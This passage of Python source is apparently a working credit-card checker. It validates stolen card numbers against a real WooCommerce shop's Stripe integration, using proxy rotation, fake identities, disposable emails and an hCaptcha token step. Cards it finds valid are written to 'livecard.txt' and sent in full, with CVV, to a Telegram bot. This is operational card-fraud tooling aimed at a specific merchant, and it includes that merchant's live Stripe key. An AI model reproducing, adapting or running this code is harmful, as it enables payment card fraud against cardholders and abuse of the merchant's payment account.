                    ch = sys.stdin.read(1)
                    resp += ch
                    if ch == "R":
                        break
                # parse
                if resp.startswith("\x1b[") and resp.endswith("R"):
                    content = resp[2:-1]
                    row_s, col_s = content.split(";")
                    return int(row_s), int(col_s)
                return None, None
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except Exception:
        return None, None


async def render_counters(
    stop: asyncio.Event, ctr: AsyncCounters, refresh: float = 0.1
) -> None:
    last_stats = {"APPROVED": -1, "DECLINED": -1, "ERROR": -1, "RETRY": -1}
    try:
        while not stop.is_set():
            stats = await ctr.snapshot()
            if any(stats.get(k, 0) != last_stats[k] for k in last_stats):
                line = (
                    f"\r{Fore.GREEN}APPROVED:{stats.get('APPROVED', 0)} "
                    f"{Fore.RED}DECLINED:{stats.get('DECLINED', 0)} "
                    f"{Fore.MAGENTA}ERROR:{stats.get('ERROR', 0)} "
                    f"{Fore.YELLOW}RETRY:{stats.get('RETRY', 0)}{Style.RESET_ALL}   "
                )
                _safe_write(line)
                last_stats = {k: stats.get(k, 0) for k in last_stats}
            await asyncio.sleep(refresh)
    finally:
        _safe_write("\n")


async def runningtext(
    message: str,
    interval: float = 0.08,
    style: str = "ascii",
    counter: Optional[AsyncCounters] = None,
) -> Tuple[asyncio.Event, asyncio.Task]:
    SPINNERS = {
        "braille": ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"],
        "dots": ["◐", "◓", "◑", "◒"],
        "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
        "ascii": ["|", "/", "-", "\\"],
    }

    frames = SPINNERS.get(style, SPINNERS["ascii"])
    spinner_idx = 0
    stop_event = asyncio.Event()

    async def animate():
        nonlocal spinner_idx
        while not stop_event.is_set():
            frame = frames[spinner_idx]

            stats = ""
            if counter:
                snap = await counter.snapshot()
                stats = (
                    f" {Fore.GREEN}APPROVED:{Fore.YELLOW}{snap.get('APPROVED', 0)}"
                    f" {Fore.RED}DECLINED:{Fore.YELLOW}{snap.get('DECLINED', 0)}"
                    f" {Fore.MAGENTA}ERROR:{Fore.YELLOW}{snap.get('ERROR', 0)}"
                    f" {Fore.YELLOW}RETRY:{Fore.YELLOW}{snap.get('RETRY', 0)}{Style.RESET_ALL}"
                )

            # \r = return to line start, \033[K = clear to end of line
            _safe_write(f"\r\033[K{frame} {message}{stats}")
            spinner_idx = (spinner_idx + 1) % len(frames)
            await asyncio.sleep(interval)

        # Clear the line once animation stops
        _safe_write("\r\033[K")

    task = asyncio.create_task(animate())
    return stop_event, task


async def stopanime(stop_event, animation_task):
    if stop_event and animation_task:
        stop_event.set()
        try:
            await animation_task
        except asyncio.CancelledError:
            pass
        width = shutil.get_terminal_size((80, 20)).columns
        _safe_write("\r" + " " * width + "\r")


async def render_animated_counters(
    stop: asyncio.Event,
    ctr: AsyncCounters,
    message: str = "Processing cards",
    refresh: float = 0.15,
    style: str = "ascii",
) -> None:
    SPINNERS = {
        "braille": ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"],
        "dots": ["◐", "◓", "◑", "◒"],
        "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
        "ascii": ["|", "/", "-", "\\"],
    }

    frames = SPINNERS.get(style, SPINNERS["ascii"])
    spinner_idx = 0
    width = shutil.get_terminal_size((80, 20)).columns

    try:
        while not stop.is_set():
            s = await ctr.snapshot()
            stats = (
                f"{Fore.LIGHTGREEN_EX}APPROVED: {Fore.WHITE}{s.get('APPROVED', 0)} | "
                f"{Fore.LIGHTRED_EX}DECLINED: {Fore.WHITE}{s.get('DECLINED', 0)} | "
                f"{Fore.LIGHTMAGENTA_EX}ERROR: {Fore.WHITE}{s.get('ERROR', 0)} | "
                f"{Fore.LIGHTYELLOW_EX}RETRY: {Fore.WHITE}{s.get('RETRY', 0)}{Fore.RESET}"
            )
            frame = frames[spinner_idx]
            line = f"\r{frame} {message}... {stats}"
            _safe_write(line + " " * max(0, width - len(line)))
            spinner_idx = (spinner_idx + 1) % len(frames)
            await asyncio.sleep(refresh)
    finally:
        _safe_write("\r" + " " * width + "\r")


class _BottomStatusBar:
    ESC = "\x1b"
    CLR = "\x1b[K"
    SAVE = "\x1b[s"
    RESTORE = "\x1b[u"

    # Tulis di baris terakhir tanpa newline agar tidak scroll
    def update(self, text: str) -> None:
        with _STDOUT_LOCK:
            sys.stdout.write(self.SAVE)
            sys.stdout.write(f"{self.ESC}[999B{self.ESC}[1G{self.CLR}{text}")
            sys.stdout.write(self.RESTORE)
            sys.stdout.flush()

    def clear(self) -> None:
        with _STDOUT_LOCK:
            sys.stdout.write(self.SAVE)
            sys.stdout.write(f"{self.ESC}[999B{self.ESC}[1G{self.CLR}")
            sys.stdout.write(self.RESTORE)
            sys.stdout.flush()


_STATUS_BAR = _BottomStatusBar()


# --- ScrollingLogger: render blok tetap di atas status, tanpa alokasi awal ---
class ScrollingLogger:
    ESC = "\x1b"
    SAVE = "\x1b[s"
    RESTORE = "\x1b[u"
    CLR = "\x1b[K"

    def __init__(self, max_lines=25):
        self.max_lines = max_lines
        self.buffer = []
        self._started = False

    def _start_if_needed(self):
        if self._started:
            return
        self._started = True
        # Tidak mengalokasikan baris baru. Hanya sinkronkan anchor.
        with _STDOUT_LOCK:
            sys.stdout.write(self.SAVE)
            sys.stdout.write(self.RESTORE)
            sys.stdout.flush()

    def log(self, message: str):
        self._start_if_needed()
        self.buffer.append(str(message))
        if len(self.buffer) > self.max_lines:
            self.buffer.pop(0)

        # render area logger sebagai blok tetap di atas baris paling bawah
        tail = self.buffer[-self.max_lines :] if self.buffer else []
        width = shutil.get_terminal_size((80, 20)).columns

        with _STDOUT_LOCK:
            sys.stdout.write(self.SAVE)
            # ke baris paling bawah kolom 1
            sys.stdout.write(f"{self.ESC}[999B{self.ESC}[1G")
            # naik ke puncak area logger
            if self.max_lines:
                sys.stdout.write(f"{self.ESC}[{self.max_lines}A")
            # tulis isi tanpa menambah baris baru di scrollback
            lines = tail + [""] * (self.max_lines - len(tail))
            for i, ln in enumerate(lines):
                text = ln
                if len(text) > width:
                    text = text[: max(0, width - 1)]  # potong agar tidak wrap
                sys.stdout.write(f"{self.ESC}[1G{self.CLR}{text}")
                if i < self.max_lines - 1:
                    # pindah ke baris berikutnya di dalam blok (aman, tidak scroll)
                    sys.stdout.write("\n")
            sys.stdout.write(self.RESTORE)
            sys.stdout.flush()


def generate_password(min_length=8, max_length=16):
    length = random.randint(min_length, max_length)

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digits = string.digits
    symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?/"

    password = [
        random.choice(lower),
        random.choice(upper),
        random.choice(digits),
        random.choice(symbols),
    ]

    all_chars = lower + upper + digits + symbols
    password += random.choices(all_chars, k=length - len(password))

    random.shuffle(password)

    return "".join(password)


def mask_pan(card: str) -> str:
    cc, mm, yy, _ = card.strip().split("|")
    masked_cc = f"{cc[:6]}{cc[6:12]}{'x' * 4}"
    return f"{masked_cc}|{mm}|{yy}|xxx"


# async def bin_lookup(bin_number: str, session: aiohttp.ClientSession):
#     try:
#         url = f"https://api.freebinchecker.com/bin/{bin_number}"
#         headers = {
#             "Accept": "application/json",
#             "User-Agent": random.choice(USERAGENTS),
#             "Connection": "keep-alive",
#             "Accept-Language": "en-US,en;q=0.9",
#         }
#         async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=25)) as r:
#             if r.status != 200:
#                 return None, "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN"
#             data = await r.json()

#         if not data.get("valid"):
#             return None, "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN"

#         card = data.get("card", {})
#         issuer = data.get("issuer", {})
#         country = data.get("country", {})

#         return (
#             f"{bin_number} - {card.get('scheme', 'UNKNOWN')} - {card.get('type', 'UNKNOWN')} - {card.get('category', 'UNKNOWN')}",
#             card.get("scheme", "UNKNOWN"),
#             card.get("type", "UNKNOWN"),
#             issuer.get("name", "UNKNOWN"),
#             country.get("name", "UNKNOWN")
#         )

#     except:
#         return None, "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN"


async def bin_lookup(bin_number: str, session: aiohttp.ClientSession):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        headers = {
            "Accept": "*/*",
            "User-Agent": random.choice(USERAGENTS),
            "Connection": "keep-alive",
            "Accept-Language": "en-US,en;q=0.9",
        }
        async with session.get(
            url, headers=headers, timeout=aiohttp.ClientTimeout(total=25)
        ) as r:
            if r.status != 200:
                return None, "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN"
            resp = await r.text()

        return (
            f"{bin_number} - {getstr_basic(resp, 'brand\":\"', '\"') or 'UNKNOWN'} - "
            f"{getstr_basic(resp, 'type\":\"', '\"') or 'UNKNOWN'} - "
            f"{getstr_basic(resp, 'level\":\"', '\"') or 'UNKNOWN'}",
            getstr_basic(resp, 'brand":"', '"') or "UNKNOWN",  # e.g. VISA
            getstr_basic(resp, 'type":"', '"') or "UNKNOWN",  # e.g. DEBIT
            getstr_basic(resp, 'bank":"', '"') or "UNKNOWN",  # e.g. JPMORGAN
            f"{getstr_basic(resp, 'country_name":"', '\"') or 'UNKNOWN'} {getstr_basic(resp, 'country_flag":"', '\"') or ''}",
        )

    except:
        return None, "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN"


def build_payment_message(
    card: str,
    last4: str,
    brand: str,
    card_type: str,
    bank: str | None,
    country_name_emoji: str,
    gateway_status: str,
    gateway_name: str = "Stripe CCN",
    dev_link: str = "https://t.me/xqndrs66",
) -> str:
    cc, mm, yy, cvv = card.strip().split("|")
    mm = mm.zfill(2)
    yy = str(yy)[-2:].zfill(2)
    card_fixed = f"{cc}|{mm}|{yy}|{cvv}"

    return (
        f"<b>- - - - - - - -﹝ CARD ﹞- - - - - - - - </b>\n"
        f"<b>CCN ⌁</b> <code>{card_fixed}</code>\n\n"
        f"<b>- - - - - - - -﹝ STATUS ﹞- - - - - - - - </b>\n"
        f"<b>Response ⌁</b> Card approved! ✅\n"
        f"<b>Gates ⌁</b> {gateway_name}\n\n"
        f"<b>- - - - - - - -﹝ ISSUER ﹞- - - - - - - - </b>\n"
        f"※ {cc[:6]} • {country_name_emoji} • {brand.upper()} • {card_type.upper()} • {bank or 'UNKNOWN'}\n\n"
        f"❞ <b>Dev</b> {dev_link.replace('https://t.me/', '@')}"
    )


async def telewebhook_async(
    session: aiohttp.ClientSession,
    BOT_TOKEN: str,
    CHATID_TELEGRAM: str,
    card: str,
    gateway_status: str,
    gateway_name: str = "Stripe Auth",
    dev_link: str = "https://t.me/xqndrs66",
):
    try:
        cc, mm, yy, cvv = card.strip().split("|")
        mm = mm.zfill(2)
        yy = str(yy)[-2:].zfill(2)
        card_fixed = f"{cc}|{mm}|{yy}|{cvv}"

        bin_number = cc[:6]
        last4 = cc[-4:]

        _, brand, card_type, bank, country_name_emoji = await bin_lookup(
            bin_number, session
        )

        text = build_payment_message(
            card_fixed,
            last4,
            brand,
            card_type,
            bank,
            country_name_emoji,
            gateway_status,
            gateway_name,
            dev_link,
        )

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHATID_TELEGRAM,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }

        async with session.post(
            url, data=payload, timeout=aiohttp.ClientTimeout(20)
        ) as resp:
            if resp.status != 200:
                await resp.text()
    except Exception:
        pass


async def fix_flag(counter, retried: bool, error: bool, new_flag: str):
    async with counter._lock:
        if new_flag == "FAILED":
            for key in ("RETRY", "ERROR"):
                if counter._data.get(key, 0) > 0:
                    counter._data[key] -= 1
                    break
        elif retried and counter._data.get("RETRY", 0) > 0:
            counter._data["RETRY"] -= 1
        elif error and counter._data.get("ERROR", 0) > 0:
            counter._data["ERROR"] -= 1

    await counter.increment(new_flag)


async def format_stats(counter):
    stats = await counter.snapshot()
    return (
        f"{Fore.GREEN}APPROVED: {Fore.RESET}{stats.get('APPROVED', 0)} {Fore.WHITE}| "
        f"{Fore.RED}DECLINED: {Fore.RESET}{stats.get('DECLINED', 0)} {Fore.WHITE}| "
        f"{Fore.MAGENTA}ERROR: {Fore.RESET}{stats.get('ERROR', 0)} {Fore.WHITE}"
    )


async def rt(attempt: int, retry_done: int, max_retries: int) -> str:
    if max_retries > 1 and attempt > 1:
        return (
            f"{Fore.LIGHTYELLOW_EX}retry {Fore.WHITE}({retry_done}/{max_retries - 1})"
        )
    return f"{Fore.LIGHTYELLOW_EX}attempt {Fore.WHITE}({attempt}/{max_retries})"


async def check_cc(
    session: ClientSession, card: str, sem: Semaphore, counter: AsyncCounters
):

    global random_user_agent

    uuid1, uuid2, uuid3, uuid4 = (
        str(uuid.uuid4()),
        str(uuid.uuid4()),
        str(uuid.uuid4()),
        str(uuid.uuid4()),
    )
    tgl = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    timestamp = int(time.time() * 1000)
    unixtime = str(timestamp)

    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = fake.free_email()
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zip_code = fake.zipcode()

    username_chars = string.ascii_lowercase + string.digits + "._"
    min_user_len = 6
    max_user_len = 12
    length = random.randint(min_user_len, max_user_len)
    username = random.choice(string.ascii_lowercase + string.digits)
    username += "".join(random.choices(username_chars, k=length - 2))
    username += random.choice(string.ascii_lowercase + string.digits)

    email_domains = [
        "startmail.com",
        "runbox.com",
        "posteo.de",
        "openmailbox.org",
        "safe-mail.net",
        "keemail.me",
        "mykolab.com",
        "eclipso.eu",
        "neomailbox.com",
        "mailbox.org",
        "msgsafe.io",
        "torguard.tg",
        "vfemail.net",
        "scryptmail.com",
        "luxsci.com",
        "onmail.com",
        "simplelogin.io",
        "anonaddy.com",
        "duck.com",
        "pm.me",
        "swissmail.org",
        "kolabnow.com",
        "mailnesia.com",
        "spamgourmet.com",
        "mailsac.com",
        "relay.firefox.com",
        "emailondeck.com",
        "moakt.com",
        "maildrop.cc",
        "nowmymail.com",
        "throwawaymail.com",
        "mailcatch.com",
        "mailnull.com",
        "spamavert.com",
        "mail-temporaire.fr",
        "rcpt.at",
        "mailnesia.com",
        "spamfree24.org",
        "temp-mail.io",
        "easytrashmail.com",
        "inboxkitten.com",
        "trashmail.de",
        "wh4f.org",
        "vibemail.net",
        "spamex.com",
        "trbvm.com",
        "getairmail.com",
        "webemail.me",
        "kurzepost.de",
        "lortemail.dk",
        "spambog.com",
        "spambog.ru",
        "yepmail.net",
        "tempail.com",
        "fakeinbox.com",
        "meltmail.com",
        "deadaddress.com",
        "jetable.org",
        "mailhazard.com",
        "tagmymail.com",
    ]
    tempmail = f"{username}@{random.choice(email_domains)}"
    password = generate_password()
    cardnum, mm, yyyy, cvv = card.strip().split("|")
    mm = mm.zfill(2)
    yy = str(yyyy)[-2:].zfill(2)
    cvv = cvv.strip()[:4]
    cardfull = f"{RESET}{cardnum}|{mm}|{yy}|{cvv}"
    CCN = f"{cardnum}|{mm}|{yy}"
    # retried = False
    # Error = False
    stop_event = None
    animation_task = None
    retry_done = 0
    for attempt in range(1, MAX_RETRIES + 1):
        retried = False
        Error = False
        async with sem:
            try:
                bin6 = cardnum[:6]
                _, brand, card_type, bank, country = await bin_lookup(
                    cardnum[:6], session
                )

                RandomUA = random.choice(USERAGENTS)
                proxy_data = next(PROXY_CYCLE)
                proxy_arg: str | None = None
                proxy_msg = f"{Fore.RED} Without Proxies!{Fore.RESET}"

                if proxy_data:
                    raw_proxy: str | None = (
                        proxy_data.get("https")
                        or proxy_data.get("http")
                        or proxy_data.get("socks5")
                        or proxy_data.get("socks4")
                    )

                    if isinstance(raw_proxy, str) and raw_proxy.strip():
                        raw_proxy = raw_proxy.strip().rstrip("/")

                        if "://" in raw_proxy:
                            scheme, rest = raw_proxy.split("://", 1)
                        else:
                            scheme, rest = "http", raw_proxy

                        parts = rest.split(":")
                        if len(parts) == 2:
                            host, port = parts
                            proxy_arg = f"{scheme}://{host}:{port}"
                        elif len(parts) == 4:
                            host, port, user, pwd = parts
                            proxy_arg = f"{scheme}://{user}:{pwd}@{host}:{port}"

                        if proxy_arg:
                            parsed = urlparse(proxy_arg)
                            proxy_ip = parsed.hostname
                            if proxy_ip:
                                proxy_msg = (
                                    f"{Fore.YELLOW} using proxies{Fore.WHITE}: "
                                    f"{Fore.BLACK}{Style.DIM}{proxy_ip}{Style.RESET_ALL}"
                                )

                if proxy_arg and proxy_arg.startswith(("socks5://", "socks4://")):
                    connector = ProxyConnector.from_url(proxy_arg)
                else:
                    connector = aiohttp.TCPConnector(ssl=False)

                stat_text1 = await format_stats(counter)
                retry_text = await rt(attempt, retry_done, MAX_RETRIES)
                retry_text = (
                    f"{Fore.LIGHTYELLOW_EX}retry {Fore.WHITE}({retry_done}/{MAX_RETRIES - 1})"
                    if MAX_RETRIES > 1 and attempt > 1
                    else f"{Fore.LIGHTYELLOW_EX}retry {Fore.WHITE}({attempt}/{MAX_RETRIES})"
                )

                stop_event, animation_task = await runningtext(
                    f"{Fore.WHITE}-{Fore.RED}> {Fore.WHITE}( {Style.DIM}{Fore.BLACK}{cardfull}{Style.RESET_ALL} {Fore.WHITE})"
                    f"{Fore.RED} <{Fore.WHITE}- {retry_text} -{Fore.RED}> "
                    f"{Fore.YELLOW}Checking {Fore.WHITE}~ {stat_text1} {Fore.WHITE}~ {proxy_msg}"
                )

                timeout = aiohttp.ClientTimeout(PROXY_TIMEOUT)
                async with aiohttp.ClientSession(
                    connector=connector, timeout=timeout
                ) as inner_session:
                    headers = {
                        "Accept": "*/*",
                        "User-Agent": random.choice(USERAGENTS),
                        "Connection": "keep-alive",
                        "Accept-Language": "en-US,en;q=0.9",
                    }
                    url = f"https://bins.antipublic.cc/bins/{cardnum[:6]}"
                    response = await inner_session.get(
                        url,
                        headers=headers,
                        proxy=proxy_arg,
                    )
                    resp = await response.text()
                    countryname = (
                        getstr_basic(resp, 'country_name":"', '"') or "UNKNOWN"
                    )

                    headers = {
                        "accept": "*/*",
                        "accept-language": "en-US,en;q=0.7",
                        "cache-control": "no-cache",
                        "pragma": "no-cache",
                        "priority": "u=0, i",
                        "referer": "https://vgba.org/my-account/add-payment-method/",
                        "user-agent": RandomUA,
                    }

                    response = await inner_session.get(
                        "https://vgba.org/my-account/add-payment-method/",
                        headers=headers,
                        proxy=proxy_arg,
                    )
                    resp = await response.text()
                    if response.status != 200:
                        retried = True
                        retry_done += 1
                        await fix_flag(counter, retried, Error, "RETRY")
                        stat_text1 = await format_stats(counter)
                        await stopanime(stop_event, animation_task)
                        print(
                            f"{Fore.WHITE}- {Fore.YELLOW}RETRY {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                            f"{Fore.WHITE}--> {Fore.YELLOW}Service unavailable, code: {statuscode}{Style.RESET_ALL}"
                        )
                        await asyncio.sleep(min(attempt**2, 30))
                        continue

                    registernon = getstr_basic(
                        resp,
                        'woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
                        '"',
                    )

                    headers = {
                        "accept": "*/*",
                        "accept-language": "en-US,en;q=0.7",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://vgba.org",
                        "pragma": "no-cache",
                        "priority": "u=0, i",
                        "referer": "https://vgba.org/my-account/add-payment-method/",
                        "user-agent": RandomUA,
                    }

                    data = {
                        "username": username,
                        "email": tempmail,
                        "password": password,
                        "woocommerce-register-nonce": registernon,
                        "_wp_http_referer": "/my-account/add-payment-method/",
                        "register": "Register",
                    }

                    response = await inner_session.post(
                        "https://vgba.org/my-account/add-payment-method/",
                        headers=headers,
                        data=data,
                        proxy=proxy_arg,
                    )
                    resp = await response.text()
                    addcardNonce = getstr_basic(
                        resp, 'add_card_nonce":"', '"'
                    ) or getstr_basic(resp, 'add_card_nonce": "', '"')
                    paymnonce = getstr_basic(
                        resp, 'woocommerce-add-payment-method-nonce" value="', '" />'
                    ) or getstr_basic(
                        resp, 'woocommerce-add-payment-method-nonce" value= "', '" />'
                    )
                    if response.status not in (200, 302):
                        retried = True
                        retry_done += 1
                        await fix_flag(counter, retried, Error, "RETRY")
                        await stopanime(stop_event, animation_task)
                        print(
                            f"{Fore.WHITE}- {Fore.YELLOW}RETRY {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                            f"{Fore.WHITE}--> {Fore.YELLOW}Retrying add card payment method failed, code: {statuscode}{Style.RESET_ALL}"
                        )
                        await asyncio.sleep(min(attempt**2, 30))

                        continue

                    headers = {
                        "accept": "application/json",
                        "accept-language": "en-US,en;q=0.7",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://js.stripe.com",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": "https://js.stripe.com/",
                        "user-agent": RandomUA,
                    }

                    data = {
                        "stripe_js_id": uuid4,
                        "referrer_host": "vgba.org",
                        "key": "pk_live_ForNC0ZMycCnJ9j5lrDWJyWG00bs3XKqKY",
                        "request_surface": "web_split_card_element_popup",
                    }

                    response = await inner_session.post(
                        "https://merchant-ui-api.stripe.com/elements/wallet-config",
                        headers=headers,
                        data=data,
                        proxy=proxy_arg,
                    )
                    resp = await response.text()
                    sitekey2 = getstr_basic(resp, 'link_hcaptcha_site_key": "', '"')

                    headers = {
                        "accept": "application/json",
                        "accept-language": "en-US,en;q=0.7",
                        "cache-control": "no-cache",
                        "content-type": "text/plain",
                        "origin": "https://newassets.hcaptcha.com",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": "https://newassets.hcaptcha.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site",
                        "sec-fetch-storage-access": "none",
                        "sec-gpc": "1",
                        "user-agent": RandomUA,
                    }

                    params = {
                        "v": "35d74bd05c00419a145c74d0100baea37ccf26da",
                        "host": "b.stripecdn.com",
                        "sitekey": "463b917e-e264-403f-ad34-34af0ee10294",
                        "sc": "1",
                        "swa": "1",
                        "spst": "0",
                    }

                    response = await inner_session.post(
                        "https://api.hcaptcha.com/checksiteconfig",
                        params=params,
                        headers=headers,
                        proxy=proxy_arg,
                    )

                    reqtoken = getstr_basic(await response.text(), 'req":"', '"')

                    headers = {
                        "accept": "application/json",
                        "accept-language": "en-US,en;q=0.7",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://js.stripe.com",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": "https://js.stripe.com/",
                        "user-agent": RandomUA,
                    }

                    data = f"type=card&billing_details[name]=+&billing_details[email]={tempmail}&card[number]={cardnum}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid={uuid1}&muid={uuid2}&sid={uuid3}&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2F3fe55641c2%3B+stripe-js-v3%2F3fe55641c2%3B+split-card-element&referrer=https%3A%2F%2Fvgba.org&time_on_page={unixtime}&client_attribution_metadata[client_session_id]=dc2c707d-cb45-4aa2-8c69-63eb51f92d48&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_ForNC0ZMycCnJ9j5lrDWJyWG00bs3XKqKY&radar_options[hcaptcha_token]=P1_{reqtoken}"

                    response = await inner_session.post(
                        "https://api.stripe.com/v1/payment_methods",
                        headers=headers,
                        data=data,
                        proxy=proxy_arg,
                    )
                    statuscode = response.status
                    resp = await response.text()
                    await stopanime(stop_event, animation_task)
                    if statuscode != 200:
                        mes = getstr_basic(resp, 'message": "', '"') or getstr_basic(
                            resp, 'code": "', '"'
                        )
                        await fix_flag(counter, retried, Error, "DECLINED")
                        stat_text1 = await format_stats(counter)
                        print(
                            f"{Fore.WHITE}- {Fore.RED}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                            f"{Fore.WHITE}--> {Fore.RED}{mes}{Style.RESET_ALL}"
                        )

                        return card, mes, resp, False

                    pmtoken = getstr_basic(resp, 'id": "', '"') or getstr_basic(
                        resp, 'id":"', '"'
                    )

                    headers = {
                        "Host": "vgba.org",
                        "X-Requested-With": "XMLHttpRequest",
                        "User-Agent": RandomUA,
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://vgba.org",
                        "Referer": "https://vgba.org/my-account/add-payment-method/",
                        "Priority": "u=1, i",
                        "Connection": "keep-alive",
                        "accept-encoding": "gzip, deflate, br",
                    }

                    params = {
                        "wc-ajax": "wc_stripe_create_setup_intent",
                    }

                    data = {
                        "stripe_source_id": pmtoken,
                        "nonce": addcardNonce,
                    }

                    response = await inner_session.post(
                        "https://vgba.org/",
                        params=params,
                        headers=headers,
                        data=data,
                        proxy=proxy_arg,
                    )

                    statuscode = response.status

                    if statuscode == 503:
                        retried = True
                        retry_done += 1
                        await fix_flag(counter, retried, Error, "RETRY")
                        stat_text1 = await format_stats(counter)
                        await stopanime(stop_event, animation_task)
                        print(
                            f"{Fore.WHITE}- {Fore.YELLOW}RETRY {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                            f"{Fore.WHITE}--> {Fore.YELLOW}Service unavailable, code: {statuscode}{Style.RESET_ALL}"
                        )
                        await asyncio.sleep(min(attempt**2, 30))
                        continue

                    resp = await response.text()

                    await stopanime(stop_event, animation_task)

                    status = getstr_basic(resp, '{"status":"', '"') or getstr_basic(
                        resp, '{"status": "', '"'
                    )
                    message = getstr_basic(resp, 'message":"', '"') or getstr_basic(
                        resp, 'message": "', '"'
                    )

                    if '{"status":"success"}' in resp:
                        await fix_flag(counter, retried, Error, "APPROVED")
                        stat_text1 = await format_stats(counter)
                        print(
                            f"{Fore.WHITE}- {Fore.GREEN}{statuscode} {Fore.GREEN}- {cardnum}|{mm}|{yy}|{cvv} "
                            f"{Fore.WHITE}--> {Fore.GREEN}APPROVED{Style.RESET_ALL}"
                        )
                        async with aiofiles.open("livecard.txt", "a") as f:
                            await f.write(f"{cardnum}|{mm}|{yy}|{cvv} -> APPROVED\n")
                        await telewebhook_async(
                            session=session,
                            BOT_TOKEN=BOT_TOKEN,
                            CHATID_TELEGRAM=CHATID_TELEGRAM,
                            card=card,
                            gateway_status=f"{status} ✅",
                            gateway_name="Stripe Auth",
                            dev_link="https://t.me/xqndrs66",
                        )
                        return card, resp, message, status, True

                    if message:
                        if message == "Invalid account.":
                            await fix_flag(counter, retried, Error, "DECLINED")
                            stat_text1 = await format_stats(counter)
                            print(
                                f"{Fore.WHITE}- {Fore.RED}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                                f"{Fore.WHITE}--> {Fore.RED}{message}{Style.RESET_ALL}"
                            )
                            return card, message, False
                        elif message == "Your card was declined.":
                            await fix_flag(counter, retried, Error, "DECLINED")
                            stat_text1 = await format_stats(counter)
                            print(
                                f"{Fore.WHITE}- {Fore.RED}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                                f"{Fore.WHITE}--> {Fore.RED}{message}{Style.RESET_ALL}"
                            )
                            return card, message, False
                        elif message == "Your card number is incorrect.":
                            await fix_flag(counter, retried, Error, "DECLINED")
                            stat_text1 = await format_stats(counter)
                            print(
                                f"{Fore.WHITE}- {Fore.RED}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                                f"{Fore.WHITE}--> {Fore.RED}{message}{Style.RESET_ALL}"
                            )
                            return card, message, False

                        elif message == "The card's expiration year is in the past":
                            await fix_flag(counter, retried, Error, "DECLINED")
                            stat_text1 = await format_stats(counter)
                            print(
                                f"{Fore.WHITE}- {Fore.RED}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                                f"{Fore.WHITE}--> {Fore.RED}The card's expiration year is in the past{Style.RESET_ALL}"
                            )
                            return card, message, False

                    else:
                        if status == "succeeded" or "succeded" in resp:
                            await fix_flag(counter, retried, Error, "APPROVED")
                            stat_text1 = await format_stats(counter)

                            print(
                                f"{Fore.WHITE}- {Fore.GREEN}{statuscode} {Fore.GREEN}- {cardnum}|{mm}|{yy}|{cvv} "
                                f"{Fore.WHITE}--> {Fore.GREEN}APPROVED{Style.RESET_ALL}"
                            )
                            async with aiofiles.open("livecard.txt", "a") as f:
                                await f.write(
                                    f"{cardnum}|{mm}|{yy}|{cvv} -> APPROVED\n"
                                )
                            await telewebhook_async(
                                session=session,
                                BOT_TOKEN=BOT_TOKEN,
                                CHATID_TELEGRAM=CHATID_TELEGRAM,
                                card=card,
                                gateway_status=f"{status} ✅",
                                gateway_name="Stripe Auth",
                                dev_link="https://t.me/xqndrs66",
                            )
                            return card, resp, message, status, True

                        else:
                            if (
                                ("Payment method successfully added." in resp)
                                or ("success" in resp)
                                or ("succeeded" in resp)
                            ):
                                await fix_flag(counter, retried, Error, "APPROVED")
                                stat_text1 = await format_stats(counter)

                                print(
                                    f"{Fore.WHITE}- {Fore.GREEN}{statuscode} {Fore.GREEN}- {cardnum}|{mm}|{yy}|{cvv} "
                                    f"{Fore.WHITE}--> {Fore.GREEN}APPROVED{Style.RESET_ALL}"
                                )
                                async with aiofiles.open("livecard.txt", "a") as f:
                                    await f.write(
                                        f"{cardnum}|{mm}|{yy}|{cvv} -> {status}\n"
                                    )
                                await telewebhook_async(
                                    session=session,
                                    BOT_TOKEN=BOT_TOKEN,
